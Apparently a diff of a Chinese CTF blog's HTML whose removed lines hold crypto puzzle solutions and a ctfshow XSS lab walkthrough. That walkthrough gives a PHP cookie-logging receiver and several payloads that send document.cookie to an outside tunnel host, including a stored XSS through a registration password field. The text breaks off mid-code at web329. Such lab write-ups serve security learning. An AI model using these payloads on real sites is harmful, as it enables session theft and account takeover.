-    <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
-        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"nonono!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这个题的意义是啥呢？<br>我就payload<code>?0=1</code>，flag就出来了。</p>
-<h2 id="传说之下（雾）"><a href="#传说之下（雾）" class="headerlink" title="传说之下（雾）"></a>传说之下（雾）</h2><p><img src="https://img-blog.csdnimg.cn/86faa25095144eb18cf9de64afbcc1da.png" alt="1">游戏界面，那就找一下js代码。<br><img src="https://img-blog.csdnimg.cn/71650c9a07134eb5b6c38dbbc521594f.png" alt="1"><br>他说分数达到2077后就给flag。在前端改一下试试，<br><img src="https://img-blog.csdnimg.cn/b6106be08f764e75a1e4894ec5956cf4.png" alt="1"><br>发现不行。再好好找一下，在js文件中搜索score。找到关键点<br><img src="https://img-blog.csdnimg.cn/8fb09945e91f47979007d09792c3f4d9.png" alt="2"><br>又学到了一个，在此处下断点（点击275即可），<br><img src="https://img-blog.csdnimg.cn/5e5a7f6f549649f78e132f1eea8d43e9.png" alt="3"><br>然后开始游戏等到吃了一个苹果的时候，程序会在断点停下，<br><img src="https://img-blog.csdnimg.cn/f4ee69e852294ad4a6759ec9dc942294.png" alt="4"><br>在控制台输入<code>var nowScore = this.score += 2078</code>回车，<br><img src="https://img-blog.csdnimg.cn/e683ba59ae094d319d18982091228622.png" alt="5"><br>然后继续游戏<br><img src="https://img-blog.csdnimg.cn/6574abd9ddaa4ac6888479fdb6939508.png" alt="6"><br>得到flag。</p>
-<h1 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h1><h2 id="0x36d"><a href="#0x36d" class="headerlink" title="0x36d"></a>0x36d</h2><p>😫🙄👰😰👣🙋😱👧👌👷👯👩😴👖👫👚🙃👹👏👏😶👳😫👕🙂🙊👵👶👨👰👮🙉👶👵👸👲👺👮👑😶👴😫🙊👫😴👬👹👤👑😱👗🙃👐😶</p>
-<p><strong>提示： 有没有一种可能，标题就是密码？</strong><br>试了一下base100解密，不行。那就是<a target="_blank" rel="noopener" href="https://txtmoji.com/">emojis解密</a>，需要密码，看题目，0x代表十六进制解密36d得到<strong>877</strong>，成功得到flag。</p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1083,68 +412,7 @@ app<span class="token punctuation">.</span>config<span class="token punctuation"
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<h2 id="jsfuck加密"><a href="#jsfuck加密" class="headerlink" title="jsfuck加密"></a>jsfuck加密</h2><p><strong>jsfuck加密</strong><br>打开控制台，复制粘贴回车得到flag。<br><img src="https://img-blog.csdnimg.cn/9bf0f33ceb1f4c35a6b09386746ae59c.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/687b19df85a746f58df6d8da3f836637.png" alt="2"></p>
-<h2 id="crypto3"><a href="#crypto3" class="headerlink" title="crypto3"></a>crypto3</h2><p>下载后用记事本打开，复制粘贴到控制台。得到flag。</p>
-<h2 id="crypto4"><a href="#crypto4" class="headerlink" title="crypto4"></a>crypto4</h2><p><strong>已知 p q e 求 d</strong></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> gmpy2
-p <span class="token operator">=</span> <span class="token number">447685307</span>
-q <span class="token operator">=</span> <span class="token number">2037</span>
-e <span class="token operator">=</span> <span class="token number">17</span>
-phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
-d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p><img src="https://img-blog.csdnimg.cn/64725cd54d814229a18167911ca6c9d6.png" alt="3"></p>
-<h2 id="crypto5"><a href="#crypto5" class="headerlink" title="crypto5"></a>crypto5</h2><p><img src="https://img-blog.csdnimg.cn/ae3ca93b1ac246b097cc59ba826eb835.png" alt="5"></p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 已知(p, q, e,c)，求m。</span>
-<span class="token keyword">import</span> gmpy2
-p<span class="token operator">=</span><span class="token number">447685307</span>
-q<span class="token operator">=</span><span class="token number">2037</span>
-e<span class="token operator">=</span><span class="token number">17</span>
-c<span class="token operator">=</span><span class="token number">704796792</span>
-
-phi <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
-d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>phi<span class="token punctuation">)</span>
-m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>powmod<span class="token punctuation">(</span>c<span class="token punctuation">,</span>d<span class="token punctuation">,</span>p<span class="token operator">*</span>q<span class="token punctuation">)</span>
-
-<span class="token keyword">print</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="rabbit解密"><a href="#rabbit解密" class="headerlink" title="rabbit解密"></a>rabbit解密</h2><p><img src="https://img-blog.csdnimg.cn/e94a5d5a735d43d880be0981bebbbbdc.png" alt="6"></p>
-<p><a target="_blank" rel="noopener" href="http://www.jsons.cn/rabbitencrypt/">rabbit解密</a></p>
-<h2 id="ook加密"><a href="#ook加密" class="headerlink" title="ook加密"></a>ook加密</h2><blockquote>
-<p>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook?<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook?<br>Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook?<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook.<br>Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook!<br>Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook. Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook! Ook! Ook! Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook.<br>Ook? Ook! Ook. Ook? Ook. Ook. Ook! Ook. Ook! Ook. Ook? Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook!<br>Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook. Ook? Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook? Ook!<br>Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook. Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook? Ook. Ook? Ook! Ook. Ook? Ook! Ook! Ook! Ook!<br>Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook!<br>Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>Ook. Ook. Ook. Ook! Ook. Ook? Ook. </p>
-</blockquote>
-<p>看不懂啊？原来是<strong>ook加密</strong></p>
-<p>这是一种很不常见的编码Ook！</p>
-<p>什么鬼？就是一种编码而已<br>通过这个地址我们可以将其解码<br>地址：<a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/">Ook编码</a><br>点击Ook！to test即可解密</p>
-<h2 id="brainfuck解密"><a href="#brainfuck解密" class="headerlink" title="brainfuck解密"></a>brainfuck解密</h2><blockquote>
-<p>+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;– -&lt;]&gt;- -.+++ +++.&lt;<br>++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ +++[- &gt;—- —-&lt; ]&gt;–. .–.- -.-.- –.-.<br>+++++ +..– -..&lt;+ +++++ +[-&gt;+ +++++ +&lt;]&gt;+ +.&lt;++ ++++[ -&gt;— —&lt;] &gt;—-<br>—– .—- -.&lt;++ ++++[ -&gt;+++ +++&lt;] &gt;++++ +++++ +++.&lt; +++++ ++[-&gt; —–<br>–&lt;]&gt; .++.- —-. &lt;++++ +++[- &gt;++++ +++&lt;] &gt;+++. –.&lt;+ +++++ [-&gt;– —-&lt;<br>]&gt;— —– —.+ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++++ ++.&lt;+ +++++ [-&gt;–<br>—-&lt; ]&gt;— —– —.- .++++ .&lt;+++ +++[- &gt;++++ ++&lt;]&gt; +++++ +++.&lt; +++++<br>+[-&gt;- —– &lt;]&gt;– —– —.- —– .++++ +++++ .—- —-. &lt;++++ ++[-&gt;<br>+++++ +&lt;]&gt;+ +++++ +++++ +.&lt;++ +++[- &gt;++++ +&lt;]&gt;+ ++.&lt;</p>
-</blockquote>
-<p><a target="_blank" rel="noopener" href="https://tool.bugku.com/brainfuck/">brainfuck解密</a><br><img src="https://img-blog.csdnimg.cn/d37a3ee90d6c4dee8b78f144403eac70.png" alt="8"></p>
-<h2 id="crypto9"><a href="#crypto9" class="headerlink" title="crypto9"></a>crypto9</h2><p>得到一个压缩包，暴力破解得到密码为<strong>4132</strong><br>下面没思路了，看了大佬的wp原来是<a target="_blank" rel="noopener" href="https://blog.csdn.net/douqingl/article/details/50256931">Serpent </a><br><a target="_blank" rel="noopener" href="http://serpent.online-domain-tools.com/">解密网址</a><br><img src="https://img-blog.csdnimg.cn/d78a4f4147ec43349d6241a756c8d818.png" alt="9"></p>
-<h2 id="crypto10"><a href="#crypto10" class="headerlink" title="crypto10"></a>crypto10</h2><blockquote>
-<p>&#x3D;E7&#x3D;94&#x3D;A8&#x3D;E4&#x3D;BD&#x3D;A0&#x3D;E9&#x3D;82&#x3D;A3&#x3D;E7&#x3D;81&#x3D;AB&#x3D;E7&#x3D;83&#x3D;AD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E5&#x3D;98&#x3D;B4&#x3D;E5&#x3D;94&#x3D;87&#x3D;E8&#x3D;AE&#x3D;A9&#x3D;E6&#x3D;88&#x3D;91&#x3D;E5&#x3D;9C&#x3D;A8&#x3D;E5&#x3D;8D&#x3D;88&#x3D;E5&#x3D;A4&#x3D;9C&#x3D;E9&#x3D;87&#x3D;8C&#x3D;E6&#x3D;97&#x3D;A0&#x3D;E5&#x3D;B0&#x3D;BD&#x3D;E7&#x3D;9A&#x3D;84&#x3D;E9&#x3D;94&#x3D;80&#x3D;E9&#x3D;AD&#x3D;82</p>
-</blockquote>
-<p>用**[随波逐流]CTF编码工具<strong>解密得到<br><img src="https://img-blog.csdnimg.cn/d702c6d9ecca46399271a62a0207cb31.png" alt="10"><br>flag为</strong>flag{用你那火热的嘴唇让我在午夜里无尽的销魂}</p>
-<h2 id="crypto11"><a href="#crypto11" class="headerlink" title="crypto11"></a>crypto11</h2><p>一看就是MD5加密<a target="_blank" rel="noopener" href="https://www.somd5.com/">解密</a></p>
-<h2 id="埃特巴什码"><a href="#埃特巴什码" class="headerlink" title="埃特巴什码"></a>埃特巴什码</h2><blockquote>
-<p>密文：uozt{Zgyzhv_xlwv_uiln_xguhsld}</p>
-</blockquote>
-<blockquote>
-<p>埃特巴什码（Atbash Cipher）其实可以视为下面要介绍的简单替换密码的特例，其原理为：它使用字母表中的最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。在罗马字母表中，它是这样出现的：<br> 明文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z<br> 密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A</p>
-</blockquote>
-<p>(埃特巴什码解密)[<a target="_blank" rel="noopener" href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/]</a></p>
- 
-      <!-- reward -->
-      
-    </div>
-    
 
     <!-- copyright -->
     
@@ -1190,111 +458,7 @@ m <span class="token operator">=</span> gmpy2<span class="token punctuation">.</
   </div>
    
     </div>
-      
-    <div class="article-entry" itemprop="articleBody">
        
-  <meta name="referrer" content="no-referrer"/>
-
-<p><img src="https://img-blog.csdnimg.cn/bd7d0276dcd141c4ae556dde560fcab9.png" alt="1"></p>
-<blockquote>
-<p>关键词：</p>
-<p> 跨站<br> 脚本（JavaScript、Java、 VBScript、ActiveX、 Flash 或者 HTML）<br> 注入<br> 执行</p>
-</blockquote>
-<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><h2 id="1-什么是-XSS-漏洞"><a href="#1-什么是-XSS-漏洞" class="headerlink" title="1. 什么是 XSS 漏洞?"></a>1. 什么是 XSS 漏洞?</h2><p>XSS 攻击：跨站脚本攻击(Cross Site Scripting)，为不和 前端层叠样式表(Cascading Style Sheets)CSS 混淆，故将跨站脚本攻击缩写为 XSS。</p>
-<p>XSS(跨站脚本攻击)是指恶意攻击者往 Web 页面里插入恶意 Script 代码，当用户浏览该页时，嵌入其中 Web 里面的 Script 代码会被执行，从而达到恶意攻击用户的目的。类似于 sql 注入。是目前最普遍的 Web 应用安全漏洞，也是 Web 攻击中最常见的攻击方式之一。</p>
-<p>XSS（ 跨站脚本攻击）攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是 JavaScript，但实际上也可以包括 Java、 VBScript、ActiveX、 Flash 或者甚至是普通的 HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和 cookie 等各种内容。</p>
-<h2 id="2-XSS-漏洞攻击原理及攻击手段"><a href="#2-XSS-漏洞攻击原理及攻击手段" class="headerlink" title="2. XSS 漏洞攻击原理及攻击手段"></a>2. XSS 漏洞攻击原理及攻击手段</h2><p>HTML 是一种超文本标记语言，通过将一些字符特殊地对待来区别文本和标记，例如，小于符号（&lt;）被看作是 HTML 标签的开始，之间的字符是页面的标题等等。</p>
-<p>当动态页面中插入的内容含有这些特殊字符（如&lt;）时，用户浏览器会将其误认为是插入了 HTML 标签，当这些 HTML 标签引入了一段 JavaScript 脚本时，这些脚本程序就将会在用户浏览器中执行。所以，当这些特殊字符不能被动态页面检查或检查出现失误时，就将会产生 XSS 漏洞。</p>
-<blockquote>
-<p>常用的 XSS 攻击手段和目的有：</p>
-<p>1、盗用 cookie，获取敏感信息。</p>
-<p>2、利用植入 Flash，通过 crossdomain 权限设置进一步获取更高权限；或者利用 Java 等得到类似的操作。</p>
-<p>3、利用 iframe、frame、XMLHttpRequest 或上述 Flash<br>等方式，以（被攻击）用户的身份执行一些管理动作，或执行一些一般的如发微博、加好友、发私信等操作。</p>
-<p>4、利用可被攻击的域受到其他域信任的特点，以受信任来源的身份请求一些平时不允许的操作，如进行不当的投票活动。</p>
-<p>5、在访问量极大的一些页面上的 XSS 可以攻击一些小型网站，实现 DDoS 攻击的效果。</p>
-</blockquote>
-<h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>使用<strong>cpolar</strong>进行内网穿透。<br>本地写入xss.php</p>
-<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
-<span class="token variable">$flag</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span><span class="token operator">=</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'flag.txt'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w+'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$flag</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span>
-<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这一题输入 <code>&lt;script&gt;windows.location.href=&#39;http://1f72xxx3.r3.cpolar.top/xss.php?c=&#39;+document.cookie&lt;/script&gt;</code>不加window也可以。<br>本地得到flag。<br>还有<code>&lt;script&gt;window.open(&#39;http://ip/&#39;+document.cookie)&lt;/script&gt;</code><br><code>&lt;svg onload=&quot;window.open(&#39;http://xxx/&#39;+document.cookie)&quot;&gt;</code><br><code>&lt;iframe onload=&quot;window.open(&#39;http://1xxx/&#39;+document.cookie)&quot;&gt;&lt;/iframe&gt;</code></p>
-<blockquote>
-<p>Window open() 方法<br>open() 方法用于打开一个新的浏览器窗口或查找一个已命名的窗口。 </p>
-</blockquote>
-<p><img src="https://img-blog.csdnimg.cn/74a587fe2e1a4b1091feeeda46152723.png" alt="1"></p>
-<h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>进行了过滤，<code>&lt;script&gt;</code>进行了过滤。那就使用<code>&lt;body&gt;</code><br><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72eccc63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>本地得到flag。</p>
-<h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>过滤img</p>
-<h2 id="web320-322"><a href="#web320-322" class="headerlink" title="web320-322"></a>web320-322</h2><p>过滤了<strong>空格</strong>采用&#x2F;**&#x2F;</p>
-<h2 id="web-323-326"><a href="#web-323-326" class="headerlink" title="web 323-326"></a>web 323-326</h2><p>过滤了xss，把本地的接收文件（<strong>xss.php</strong>）改为<strong>x.php</strong></p>
-<p>以上都是反射型，接下来是<strong>存储型</strong>。</p>
-<h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p><code>&lt;body onload=&quot;window.location.href=&#39;http://1f72ffec63.r3.cpolar.top/xss.php?c=&#39;+document.cookie&quot;&gt;</code><br>需注意收件人必须是admin。</p>
-<h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><p>用户管理处显示我们不是admin<br><img src="https://img-blog.csdnimg.cn/df99dac33016489fab135c338cb89030.png" alt="1"><br>所以我们注册一个用户进行xss，因为在注册用户时会把账户密码存储起来，当管理员打开页面时会进行攻击并且得到cookie。</p>
-<p><img src="https://img-blog.csdnimg.cn/e20c9afd03ac4145ae80e7d5fd32c59d.png" alt="2"><br>密码为：<code>&lt;script&gt;document.location.href=&#39;http://1f72ec63.r3.cpolar.top/x.php?c=&#39;+document.cookie&lt;/script&gt;</code>过一段时间后本地文件会得到cookie<br><img src="https://img-blog.csdnimg.cn/b1fc82f156f840fdb7f7a2c13fe9ece0.png" alt="3"><br>进入用户管理页面没找到flag。用burp抓包试试。<br><img src="https://img-blog.csdnimg.cn/66ded499169947dcb2ea50d53888a948.png" alt="5"></p>
-<h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>上题的思路不能用了，发现admin的cookie会改变，使用后就不能用了。<br>看了师傅们文章，借鉴一下：</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>
